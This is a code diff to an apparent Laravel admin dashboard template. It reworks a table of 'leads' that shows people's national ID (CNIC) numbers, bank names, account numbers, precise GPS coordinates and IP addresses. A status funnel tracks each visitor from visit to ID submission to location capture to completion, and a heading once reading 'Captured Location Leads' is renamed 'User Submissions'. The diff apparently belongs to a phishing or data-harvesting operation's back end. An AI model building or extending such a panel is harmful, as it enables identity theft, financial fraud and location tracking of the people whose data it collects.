@@ -177,38 +177,60 @@
                         <!-- LEADS TAB -->
                         <div class="tab-pane fade {{ session('active_tab') == 'leads' ? 'show active' : '' }}" id="leads" role="tabpanel">
                             <div class="d-flex justify-content-between align-items-center mb-3">
-                                <h5 class="mb-0">Captured Location Leads</h5>
+                                <h5 class="mb-0">User Submissions ({{ $leads->count() }})</h5>
                             </div>
 
                             <div class="table-responsive">
-                                <table class="table table-hover">
+                                <table class="table table-hover table-sm">
                                     <thead class="table-light">
                                         <tr>
-                                            <th width="12%">Captured</th>
-                                            <th width="13%">CNIC</th>
-                                            <th width="14%">Bank</th>
-                                            <th width="14%">Account</th>
-                                            <th width="14%">Latitude</th>
-                                            <th width="14%">Longitude</th>
-                                            <th width="9%">Accuracy</th>
-                                            <th width="10%">IP</th>
+                                            <th width="4%">#</th>
+                                            <th width="10%">First Visit</th>
+                                            <th width="10%">CNIC</th>
+                                            <th width="9%">Status</th>
+                                            <th width="14%">Location</th>
+                                            <th width="7%">Accuracy</th>
+                                            <th width="11%">Bank</th>
+                                            <th width="11%">Account</th>
+                                            <th width="10%">First IP</th>
+                                            <th width="10%">Current IP</th>
                                         </tr>
                                     </thead>
                                     <tbody>
                                         @forelse($leads as $lead)
                                         <tr>
-                                            <td><small>{{ optional($lead->created_at)->format('d M Y H:i') }}</small></td>
-                                            <td>{{ $lead->cnic }}</td>
+                                            <td>{{ $lead->id }}</td>
+                                            <td><small>{{ optional($lead->first_visit_at)->format('d M H:i') ?: $lead->created_at->format('d M H:i') }}</small></td>
+                                            <td>{{ $lead->cnic ? $lead->cnic : '-' }}</td>
+                                            <td>
+                                                @if($lead->status === 'completed')
+                                                    <span class="badge bg-success">Done</span>
+                                                @elseif($lead->status === 'location_captured')
+                                                    <span class="badge bg-info">Location</span>
+                                                @elseif($lead->status === 'cnic_submitted')
+                                                    <span class="badge bg-warning text-dark">CNIC</span>
+                                                @elseif($lead->status === 'visited')
+                                                    <span class="badge bg-secondary">Visited</span>
+                                                @else
+                                                    <span class="badge bg-secondary">{{ $lead->status }}</span>
+                                                @endif
+                                            </td>
+                                            <td>
+                                                @if($lead->latitude)
+                                                    <small>{{ number_format($lead->latitude, 4) }}, {{ number_format($lead->longitude, 4) }}</small>
+                                                @else
+                                                    <span class="text-muted">-</span>
+                                                @endif
+                                            </td>
+                                            <td>{{ $lead->accuracy ? round($lead->accuracy) . 'm' : '-' }}</td>
                                             <td>{{ $lead->bank_name ?: '-' }}</td>
                                             <td>{{ $lead->account_number ?: '-' }}</td>
-                                            <td>{{ $lead->latitude }}</td>
-                                            <td>{{ $lead->longitude }}</td>
-                                            <td>{{ $lead->accuracy ? $lead->accuracy . 'm' : '-' }}</td>
+                                            <td><small>{{ $lead->first_visit_ip ?: '-' }}</small></td>
                                             <td><small>{{ $lead->ip_address ?: '-' }}</small></td>
                                         </tr>
                                         @empty
                                         <tr>
-                                            <td colspan="8" class="text-center text-muted">No location leads captured yet.</td>
+                                            <td colspan="10" class="text-center text-muted">No submissions yet.</td>
                                         </tr>
                                         @endforelse
                                     </tbody>
